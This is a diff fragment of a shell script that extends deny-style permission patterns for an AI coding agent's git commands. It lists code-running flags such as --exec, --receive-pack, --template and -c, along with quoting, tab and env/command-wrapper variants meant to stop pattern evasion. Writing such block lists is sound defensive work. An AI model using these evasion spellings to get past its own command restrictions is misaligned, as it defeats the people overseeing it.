+    $'Bash(git*commit*--\"repo\"*)'
+    $'Bash(git commit \"--recu\"*)'
+    $'Bash(git commit \"--recu\":*)'
+    $'Bash(git*commit*\"--recu\"*)'
+    $'Bash(git commit --\"recu\"*)'
+    $'Bash(git*commit*--\"recu\"*)'
+    $'Bash(git commit \"--recurse-submodules\"*)'
+    $'Bash(git commit \"--recurse-submodules\":*)'
+    $'Bash(git*commit*\"--recurse-submodules\"*)'
+    $'Bash(git commit --\"recurse-submodules\"*)'
+    $'Bash(git*commit*--\"recurse-submodules\"*)'
+    $'Bash(git commit \"--r\"*)'
+    $'Bash(git commit \"--r\":*)'
+    $'Bash(git*commit*\"--r\"*)'
+    $'Bash(git commit --\"r\"*)'
+    $'Bash(git*commit*--\"r\"*)'
+    'Bash(git push '\''-e'\''*)'
+    'Bash(git push '\''-e'\'':*)'
+    'Bash(git*push*'\''-e'\''*)'
+    'Bash(git push '\''-c'\''*)'
+    'Bash(git push '\''-c'\'':*)'
+    'Bash(git*push*'\''-c'\''*)'
+    'Bash(git push '\''-S'\''*)'
+    'Bash(git push '\''-S'\'':*)'
+    'Bash(git*push*'\''-S'\''*)'
+    'Bash(git push '\''-t'\''*)'
+    'Bash(git push '\''-t'\'':*)'
+    'Bash(git*push*'\''-t'\''*)'
+    'Bash(git push '\''--e'\''*)'
+    'Bash(git push '\''--e'\'':*)'
+    'Bash(git*push*'\''--e'\''*)'
+    'Bash(git push --'\''e'\''*)'
+    'Bash(git*push*--'\''e'\''*)'
+    'Bash(git push '\''--edit'\''*)'
+    'Bash(git push '\''--edit'\'':*)'
+    'Bash(git*push*'\''--edit'\''*)'
+    'Bash(git push --'\''edit'\''*)'
+    'Bash(git*push*--'\''edit'\''*)'
+    'Bash(git push '\''--g'\''*)'
+    'Bash(git push '\''--g'\'':*)'
+    'Bash(git*push*'\''--g'\''*)'
+    'Bash(git push --'\''g'\''*)'
+    'Bash(git*push*--'\''g'\''*)'
+    'Bash(git push '\''--gpg-sign'\''*)'
+    'Bash(git push '\''--gpg-sign'\'':*)'
+    'Bash(git*push*'\''--gpg-sign'\''*)'
+    'Bash(git push --'\''gpg-sign'\''*)'
+    'Bash(git*push*--'\''gpg-sign'\''*)'
+    'Bash(git push '\''--te'\''*)'
+    'Bash(git push '\''--te'\'':*)'
+    'Bash(git*push*'\''--te'\''*)'
+    'Bash(git push --'\''te'\''*)'
+    'Bash(git*push*--'\''te'\''*)'
+    'Bash(git push '\''--template'\''*)'
+    'Bash(git push '\''--template'\'':*)'
+    'Bash(git*push*'\''--template'\''*)'
+    'Bash(git push --'\''template'\''*)'
+    'Bash(git*push*--'\''template'\''*)'
+    'Bash(git push '\''--sq'\''*)'
+    'Bash(git push '\''--sq'\'':*)'
+    'Bash(git*push*'\''--sq'\''*)'
+    'Bash(git push --'\''sq'\''*)'
+    'Bash(git*push*--'\''sq'\''*)'
+    'Bash(git push '\''--squash'\''*)'
+    'Bash(git push '\''--squash'\'':*)'
+    'Bash(git*push*'\''--squash'\''*)'
+    'Bash(git push --'\''squash'\''*)'
+    'Bash(git*push*--'\''squash'\''*)'
+    'Bash(git push '\''--fix'\''*)'
+    'Bash(git push '\''--fix'\'':*)'
+    'Bash(git*push*'\''--fix'\''*)'
+    'Bash(git push --'\''fix'\''*)'
+    'Bash(git*push*--'\''fix'\''*)'
+    'Bash(git push '\''--fixup'\''*)'
+    'Bash(git push '\''--fixup'\'':*)'
+    'Bash(git*push*'\''--fixup'\''*)'
+    'Bash(git push --'\''fixup'\''*)'
+    'Bash(git*push*--'\''fixup'\''*)'
+    'Bash(git push '\''--rece'\''*)'
+    'Bash(git push '\''--rece'\'':*)'
+    'Bash(git*push*'\''--rece'\''*)'
+    'Bash(git push --'\''rece'\''*)'
+    'Bash(git*push*--'\''rece'\''*)'
+    'Bash(git push '\''--receive-pack'\''*)'
+    'Bash(git push '\''--receive-pack'\'':*)'
+    'Bash(git*push*'\''--receive-pack'\''*)'
+    'Bash(git push --'\''receive-pack'\''*)'
+    'Bash(git*push*--'\''receive-pack'\''*)'
+    'Bash(git push '\''--exec'\''*)'
+    'Bash(git push '\''--exec'\'':*)'
+    'Bash(git*push*'\''--exec'\''*)'
+    'Bash(git push --'\''exec'\''*)'
+    'Bash(git*push*--'\''exec'\''*)'
+    'Bash(git push '\''--rep'\''*)'
+    'Bash(git push '\''--rep'\'':*)'
+    'Bash(git*push*'\''--rep'\''*)'
+    'Bash(git push --'\''rep'\''*)'
+    'Bash(git*push*--'\''rep'\''*)'
+    'Bash(git push '\''--repo'\''*)'
+    'Bash(git push '\''--repo'\'':*)'
+    'Bash(git*push*'\''--repo'\''*)'
+    'Bash(git push --'\''repo'\''*)'
+    'Bash(git*push*--'\''repo'\''*)'
+    'Bash(git push '\''--recu'\''*)'
+    'Bash(git push '\''--recu'\'':*)'
+    'Bash(git*push*'\''--recu'\''*)'
+    'Bash(git push --'\''recu'\''*)'
+    'Bash(git*push*--'\''recu'\''*)'
+    'Bash(git push '\''--recurse-submodules'\''*)'
+    'Bash(git push '\''--recurse-submodules'\'':*)'
+    'Bash(git*push*'\''--recurse-submodules'\''*)'
+    'Bash(git push --'\''recurse-submodules'\''*)'
+    'Bash(git*push*--'\''recurse-submodules'\''*)'
+    'Bash(git push '\''--r'\''*)'
+    'Bash(git push '\''--r'\'':*)'
+    'Bash(git*push*'\''--r'\''*)'
+    'Bash(git push --'\''r'\''*)'
+    'Bash(git*push*--'\''r'\''*)'
+    $'Bash(git push \"-e\"*)'
+    $'Bash(git push \"-e\":*)'
+    $'Bash(git*push*\"-e\"*)'
+    $'Bash(git push \"-c\"*)'
+    $'Bash(git push \"-c\":*)'
+    $'Bash(git*push*\"-c\"*)'
+    $'Bash(git push \"-S\"*)'
+    $'Bash(git push \"-S\":*)'
+    $'Bash(git*push*\"-S\"*)'
+    $'Bash(git push \"-t\"*)'
+    $'Bash(git push \"-t\":*)'
+    $'Bash(git*push*\"-t\"*)'
+    $'Bash(git push \"--e\"*)'
+    $'Bash(git push \"--e\":*)'
+    $'Bash(git*push*\"--e\"*)'
+    $'Bash(git push --\"e\"*)'
+    $'Bash(git*push*--\"e\"*)'
+    $'Bash(git push \"--edit\"*)'
+    $'Bash(git push \"--edit\":*)'
+    $'Bash(git*push*\"--edit\"*)'
+    $'Bash(git push --\"edit\"*)'
+    $'Bash(git*push*--\"edit\"*)'
+    $'Bash(git push \"--g\"*)'
+    $'Bash(git push \"--g\":*)'
+    $'Bash(git*push*\"--g\"*)'
+    $'Bash(git push --\"g\"*)'
+    $'Bash(git*push*--\"g\"*)'
+    $'Bash(git push \"--gpg-sign\"*)'
+    $'Bash(git push \"--gpg-sign\":*)'
+    $'Bash(git*push*\"--gpg-sign\"*)'
+    $'Bash(git push --\"gpg-sign\"*)'
+    $'Bash(git*push*--\"gpg-sign\"*)'
+    $'Bash(git push \"--te\"*)'
+    $'Bash(git push \"--te\":*)'
+    $'Bash(git*push*\"--te\"*)'
+    $'Bash(git push --\"te\"*)'
+    $'Bash(git*push*--\"te\"*)'
+    $'Bash(git push \"--template\"*)'
+    $'Bash(git push \"--template\":*)'
+    $'Bash(git*push*\"--template\"*)'
+    $'Bash(git push --\"template\"*)'
+    $'Bash(git*push*--\"template\"*)'
+    $'Bash(git push \"--sq\"*)'
+    $'Bash(git push \"--sq\":*)'
+    $'Bash(git*push*\"--sq\"*)'
+    $'Bash(git push --\"sq\"*)'
+    $'Bash(git*push*--\"sq\"*)'
+    $'Bash(git push \"--squash\"*)'
+    $'Bash(git push \"--squash\":*)'
+    $'Bash(git*push*\"--squash\"*)'
+    $'Bash(git push --\"squash\"*)'
+    $'Bash(git*push*--\"squash\"*)'
+    $'Bash(git push \"--fix\"*)'
+    $'Bash(git push \"--fix\":*)'
+    $'Bash(git*push*\"--fix\"*)'
+    $'Bash(git push --\"fix\"*)'
+    $'Bash(git*push*--\"fix\"*)'
+    $'Bash(git push \"--fixup\"*)'
+    $'Bash(git push \"--fixup\":*)'
+    $'Bash(git*push*\"--fixup\"*)'
+    $'Bash(git push --\"fixup\"*)'
+    $'Bash(git*push*--\"fixup\"*)'
+    $'Bash(git push \"--rece\"*)'
+    $'Bash(git push \"--rece\":*)'
+    $'Bash(git*push*\"--rece\"*)'
+    $'Bash(git push --\"rece\"*)'
+    $'Bash(git*push*--\"rece\"*)'
+    $'Bash(git push \"--receive-pack\"*)'
+    $'Bash(git push \"--receive-pack\":*)'
+    $'Bash(git*push*\"--receive-pack\"*)'
+    $'Bash(git push --\"receive-pack\"*)'
+    $'Bash(git*push*--\"receive-pack\"*)'
+    $'Bash(git push \"--exec\"*)'
+    $'Bash(git push \"--exec\":*)'
+    $'Bash(git*push*\"--exec\"*)'
+    $'Bash(git push --\"exec\"*)'
+    $'Bash(git*push*--\"exec\"*)'
+    $'Bash(git push \"--rep\"*)'
+    $'Bash(git push \"--rep\":*)'
+    $'Bash(git*push*\"--rep\"*)'
+    $'Bash(git push --\"rep\"*)'
+    $'Bash(git*push*--\"rep\"*)'
+    $'Bash(git push \"--repo\"*)'
+    $'Bash(git push \"--repo\":*)'
+    $'Bash(git*push*\"--repo\"*)'
+    $'Bash(git push --\"repo\"*)'
+    $'Bash(git*push*--\"repo\"*)'
+    $'Bash(git push \"--recu\"*)'
+    $'Bash(git push \"--recu\":*)'
+    $'Bash(git*push*\"--recu\"*)'
+    $'Bash(git push --\"recu\"*)'
+    $'Bash(git*push*--\"recu\"*)'
+    $'Bash(git push \"--recurse-submodules\"*)'
+    $'Bash(git push \"--recurse-submodules\":*)'
+    $'Bash(git*push*\"--recurse-submodules\"*)'
+    $'Bash(git push --\"recurse-submodules\"*)'
+    $'Bash(git*push*--\"recurse-submodules\"*)'
+    $'Bash(git push \"--r\"*)'
+    $'Bash(git push \"--r\":*)'
+    $'Bash(git*push*\"--r\"*)'
+    $'Bash(git push --\"r\"*)'
+    $'Bash(git*push*--\"r\"*)'
+    'Bash(git checkout '\''-e'\''*)'
+    'Bash(git checkout '\''-e'\'':*)'
+    'Bash(git*checkout*'\''-e'\''*)'
+    'Bash(git checkout '\''-c'\''*)'
+    'Bash(git checkout '\''-c'\'':*)'
+    'Bash(git*checkout*'\''-c'\''*)'
+    'Bash(git checkout '\''-S'\''*)'
+    'Bash(git checkout '\''-S'\'':*)'
+    'Bash(git*checkout*'\''-S'\''*)'
+    'Bash(git checkout '\''-t'\''*)'
+    'Bash(git checkout '\''-t'\'':*)'
+    'Bash(git*checkout*'\''-t'\''*)'
+    'Bash(git checkout '\''--e'\''*)'
+    'Bash(git checkout '\''--e'\'':*)'
+    'Bash(git*checkout*'\''--e'\''*)'
+    'Bash(git checkout --'\''e'\''*)'
+    'Bash(git*checkout*--'\''e'\''*)'
+    'Bash(git checkout '\''--edit'\''*)'
+    'Bash(git checkout '\''--edit'\'':*)'
+    'Bash(git*checkout*'\''--edit'\''*)'
+    'Bash(git checkout --'\''edit'\''*)'
+    'Bash(git*checkout*--'\''edit'\''*)'
+    'Bash(git checkout '\''--g'\''*)'
+    'Bash(git checkout '\''--g'\'':*)'
+    'Bash(git*checkout*'\''--g'\''*)'
+    'Bash(git checkout --'\''g'\''*)'
+    'Bash(git*checkout*--'\''g'\''*)'
+    'Bash(git checkout '\''--gpg-sign'\''*)'
+    'Bash(git checkout '\''--gpg-sign'\'':*)'
+    'Bash(git*checkout*'\''--gpg-sign'\''*)'
+    'Bash(git checkout --'\''gpg-sign'\''*)'
+    'Bash(git*checkout*--'\''gpg-sign'\''*)'
+    'Bash(git checkout '\''--te'\''*)'
+    'Bash(git checkout '\''--te'\'':*)'
+    'Bash(git*checkout*'\''--te'\''*)'
+    'Bash(git checkout --'\''te'\''*)'
+    'Bash(git*checkout*--'\''te'\''*)'
+    'Bash(git checkout '\''--template'\''*)'
+    'Bash(git checkout '\''--template'\'':*)'
+    'Bash(git*checkout*'\''--template'\''*)'
+    'Bash(git checkout --'\''template'\''*)'
+    'Bash(git*checkout*--'\''template'\''*)'
+    'Bash(git checkout '\''--sq'\''*)'
+    'Bash(git checkout '\''--sq'\'':*)'
+    'Bash(git*checkout*'\''--sq'\''*)'
+    'Bash(git checkout --'\''sq'\''*)'
+    'Bash(git*checkout*--'\''sq'\''*)'
+    'Bash(git checkout '\''--squash'\''*)'
+    'Bash(git checkout '\''--squash'\'':*)'
+    'Bash(git*checkout*'\''--squash'\''*)'
+    'Bash(git checkout --'\''squash'\''*)'
+    'Bash(git*checkout*--'\''squash'\''*)'
+    'Bash(git checkout '\''--fix'\''*)'
+    'Bash(git checkout '\''--fix'\'':*)'
+    'Bash(git*checkout*'\''--fix'\''*)'
+    'Bash(git checkout --'\''fix'\''*)'
+    'Bash(git*checkout*--'\''fix'\''*)'
+    'Bash(git checkout '\''--fixup'\''*)'
+    'Bash(git checkout '\''--fixup'\'':*)'
+    'Bash(git*checkout*'\''--fixup'\''*)'
+    'Bash(git checkout --'\''fixup'\''*)'
+    'Bash(git*checkout*--'\''fixup'\''*)'
+    'Bash(git checkout '\''--rece'\''*)'
+    'Bash(git checkout '\''--rece'\'':*)'
+    'Bash(git*checkout*'\''--rece'\''*)'
+    'Bash(git checkout --'\''rece'\''*)'
+    'Bash(git*checkout*--'\''rece'\''*)'
+    'Bash(git checkout '\''--receive-pack'\''*)'
+    'Bash(git checkout '\''--receive-pack'\'':*)'
+    'Bash(git*checkout*'\''--receive-pack'\''*)'
+    'Bash(git checkout --'\''receive-pack'\''*)'
+    'Bash(git*checkout*--'\''receive-pack'\''*)'
+    'Bash(git checkout '\''--exec'\''*)'
+    'Bash(git checkout '\''--exec'\'':*)'
+    'Bash(git*checkout*'\''--exec'\''*)'
+    'Bash(git checkout --'\''exec'\''*)'
+    'Bash(git*checkout*--'\''exec'\''*)'
+    'Bash(git checkout '\''--rep'\''*)'
+    'Bash(git checkout '\''--rep'\'':*)'
+    'Bash(git*checkout*'\''--rep'\''*)'
+    'Bash(git checkout --'\''rep'\''*)'
+    'Bash(git*checkout*--'\''rep'\''*)'
+    'Bash(git checkout '\''--repo'\''*)'
+    'Bash(git checkout '\''--repo'\'':*)'
+    'Bash(git*checkout*'\''--repo'\''*)'
+    'Bash(git checkout --'\''repo'\''*)'
+    'Bash(git*checkout*--'\''repo'\''*)'
+    'Bash(git checkout '\''--recu'\''*)'
+    'Bash(git checkout '\''--recu'\'':*)'
+    'Bash(git*checkout*'\''--recu'\''*)'
+    'Bash(git checkout --'\''recu'\''*)'
+    'Bash(git*checkout*--'\''recu'\''*)'
+    'Bash(git checkout '\''--recurse-submodules'\''*)'
+    'Bash(git checkout '\''--recurse-submodules'\'':*)'
+    'Bash(git*checkout*'\''--recurse-submodules'\''*)'
+    'Bash(git checkout --'\''recurse-submodules'\''*)'
+    'Bash(git*checkout*--'\''recurse-submodules'\''*)'
+    'Bash(git checkout '\''--r'\''*)'
+    'Bash(git checkout '\''--r'\'':*)'
+    'Bash(git*checkout*'\''--r'\''*)'
+    'Bash(git checkout --'\''r'\''*)'
+    'Bash(git*checkout*--'\''r'\''*)'
+    $'Bash(git checkout \"-e\"*)'
+    $'Bash(git checkout \"-e\":*)'
+    $'Bash(git*checkout*\"-e\"*)'
+    $'Bash(git checkout \"-c\"*)'
+    $'Bash(git checkout \"-c\":*)'
+    $'Bash(git*checkout*\"-c\"*)'
+    $'Bash(git checkout \"-S\"*)'
+    $'Bash(git checkout \"-S\":*)'
+    $'Bash(git*checkout*\"-S\"*)'
+    $'Bash(git checkout \"-t\"*)'
+    $'Bash(git checkout \"-t\":*)'
+    $'Bash(git*checkout*\"-t\"*)'
+    $'Bash(git checkout \"--e\"*)'
+    $'Bash(git checkout \"--e\":*)'
+    $'Bash(git*checkout*\"--e\"*)'
+    $'Bash(git checkout --\"e\"*)'
+    $'Bash(git*checkout*--\"e\"*)'
+    $'Bash(git checkout \"--edit\"*)'
+    $'Bash(git checkout \"--edit\":*)'
+    $'Bash(git*checkout*\"--edit\"*)'
+    $'Bash(git checkout --\"edit\"*)'
+    $'Bash(git*checkout*--\"edit\"*)'
+    $'Bash(git checkout \"--g\"*)'
+    $'Bash(git checkout \"--g\":*)'
+    $'Bash(git*checkout*\"--g\"*)'
+    $'Bash(git checkout --\"g\"*)'
+    $'Bash(git*checkout*--\"g\"*)'
+    $'Bash(git checkout \"--gpg-sign\"*)'
+    $'Bash(git checkout \"--gpg-sign\":*)'
+    $'Bash(git*checkout*\"--gpg-sign\"*)'
+    $'Bash(git checkout --\"gpg-sign\"*)'
+    $'Bash(git*checkout*--\"gpg-sign\"*)'
+    $'Bash(git checkout \"--te\"*)'
+    $'Bash(git checkout \"--te\":*)'
+    $'Bash(git*checkout*\"--te\"*)'
+    $'Bash(git checkout --\"te\"*)'
+    $'Bash(git*checkout*--\"te\"*)'
+    $'Bash(git checkout \"--template\"*)'
+    $'Bash(git checkout \"--template\":*)'
+    $'Bash(git*checkout*\"--template\"*)'
+    $'Bash(git checkout --\"template\"*)'
+    $'Bash(git*checkout*--\"template\"*)'
+    $'Bash(git checkout \"--sq\"*)'
+    $'Bash(git checkout \"--sq\":*)'
+    $'Bash(git*checkout*\"--sq\"*)'
+    $'Bash(git checkout --\"sq\"*)'
+    $'Bash(git*checkout*--\"sq\"*)'
+    $'Bash(git checkout \"--squash\"*)'
+    $'Bash(git checkout \"--squash\":*)'
+    $'Bash(git*checkout*\"--squash\"*)'
+    $'Bash(git checkout --\"squash\"*)'
+    $'Bash(git*checkout*--\"squash\"*)'
+    $'Bash(git checkout \"--fix\"*)'
+    $'Bash(git checkout \"--fix\":*)'
+    $'Bash(git*checkout*\"--fix\"*)'
+    $'Bash(git checkout --\"fix\"*)'
+    $'Bash(git*checkout*--\"fix\"*)'
+    $'Bash(git checkout \"--fixup\"*)'
+    $'Bash(git checkout \"--fixup\":*)'
+    $'Bash(git*checkout*\"--fixup\"*)'
+    $'Bash(git checkout --\"fixup\"*)'
+    $'Bash(git*checkout*--\"fixup\"*)'
+    $'Bash(git checkout \"--rece\"*)'
+    $'Bash(git checkout \"--rece\":*)'
+    $'Bash(git*checkout*\"--rece\"*)'
+    $'Bash(git checkout --\"rece\"*)'
+    $'Bash(git*checkout*--\"rece\"*)'
+    $'Bash(git checkout \"--receive-pack\"*)'
+    $'Bash(git checkout \"--receive-pack\":*)'
+    $'Bash(git*checkout*\"--receive-pack\"*)'
+    $'Bash(git checkout --\"receive-pack\"*)'
+    $'Bash(git*checkout*--\"receive-pack\"*)'
+    $'Bash(git checkout \"--exec\"*)'
+    $'Bash(git checkout \"--exec\":*)'
+    $'Bash(git*checkout*\"--exec\"*)'
+    $'Bash(git checkout --\"exec\"*)'
+    $'Bash(git*checkout*--\"exec\"*)'
+    $'Bash(git checkout \"--rep\"*)'
+    $'Bash(git checkout \"--rep\":*)'
+    $'Bash(git*checkout*\"--rep\"*)'
+    $'Bash(git checkout --\"rep\"*)'
+    $'Bash(git*checkout*--\"rep\"*)'
+    $'Bash(git checkout \"--repo\"*)'
+    $'Bash(git checkout \"--repo\":*)'
+    $'Bash(git*checkout*\"--repo\"*)'
+    $'Bash(git checkout --\"repo\"*)'
+    $'Bash(git*checkout*--\"repo\"*)'
+    $'Bash(git checkout \"--recu\"*)'
+    $'Bash(git checkout \"--recu\":*)'
+    $'Bash(git*checkout*\"--recu\"*)'
+    $'Bash(git checkout --\"recu\"*)'
+    $'Bash(git*checkout*--\"recu\"*)'
+    $'Bash(git checkout \"--recurse-submodules\"*)'
+    $'Bash(git checkout \"--recurse-submodules\":*)'
+    $'Bash(git*checkout*\"--recurse-submodules\"*)'
+    $'Bash(git checkout --\"recurse-submodules\"*)'
+    $'Bash(git*checkout*--\"recurse-submodules\"*)'
+    $'Bash(git checkout \"--r\"*)'
+    $'Bash(git checkout \"--r\":*)'
+    $'Bash(git*checkout*\"--r\"*)'
+    $'Bash(git checkout --\"r\"*)'
+    $'Bash(git*checkout*--\"r\"*)'
   )
   local GIT_FLOOR_CANARY=(
-    "Bash(/usr/bin/env git*)"
-    "Bash(env * git*)"
-    "Bash(command -- git*)"
     "Bash(git*push*https*)"
+    "Bash(git*push*:**)"
+    "Bash(git*add -e:*)"
+    $'Bash(git add\t -e:*)'
+    $'Bash(git add \t-e:*)'
+    "Bash(git*-c:*)"
+    "Bash(git  -*)"
+    $'Bash(git\t-*)'
     "Bash(git send-pack:*)"
+    "Bash(git send-pack*)"
+    "Bash(git http-push:*)"
+    "Bash(git fetch-pack:*)"
+    "Bash(git http-fetch:*)"
+    "Bash(git commit*--fix:*)"
+    "Bash(git commit*--fix*)"
+    "Bash(git commit -at:*)"
+    "Bash(git commit -qt:*)"
+    "Bash(git commit -ve:*)"
+    "Bash(git commit -se:*)"
+    "Bash(git commit -ue:*)"
+    "Bash(git commit -me:*)"
+    "Bash(git commit -pe:*)"
+    "Bash(git -*)"
+    "Bash(git push*https*)"
+    "Bash(git add -e:*)"
+    "Bash(git commit*--te:*)"
+    "Bash(git commit*--sq:*)"
+    "Bash(git remote*)"
+    "Bash(command*git*)"
+    "Bash(env*git*)"
+    "Bash(/usr/bin/env*git*)"
+    "Bash(git apply:*)"
+    "Bash(git*apply*)"
+    "Bash(git am:*)"
+    $'Bash(git\tam*)'
+    "Bash(git init:*)"
+    "Bash(git*init*)"
+    'Bash(git add '\''-e'\''*)'
+    $'Bash(git add \"-e\"*)'
+    'Bash(git add --'\''edit'\''*)'
+    'Bash(git commit --'\''fixup'\''*)'
+    'Bash(git*push*--'\''exec'\''*)'
     "Bash(/usr/bin/git*)"
     "Bash(GIT_*:*)"
     "Bash(git web--browse:*)"
     "Bash(git checkout-index:*)"
-    "Bash(git -*)"
-    "Bash(git add -e:*)"
   )
   python3 - "$tmp/reviewer.json" "${GH_FLOOR[@]}" <<'PY2'
 import json, sys
